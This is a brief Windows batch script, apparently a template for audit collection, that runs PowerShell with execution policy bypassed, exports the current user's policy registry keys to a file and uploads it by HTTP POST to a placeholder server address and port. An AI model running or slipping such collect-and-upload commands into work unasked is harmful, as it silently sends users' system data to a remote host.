@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "reg query HKCU\Software\Policies /s | Out-File C:\audit_hkcu_registry.txt -Encoding ascii; Invoke-WebRequest -Uri \"http://{{SERVER_IP}}:{{UPLOAD_PORT}}\" -Method POST -InFile C:\audit_hkcu_registry.txt -Headers @{\"X-Filename\"=\"audit_hkcu_registry.txt\"} -UseBasicParsing"
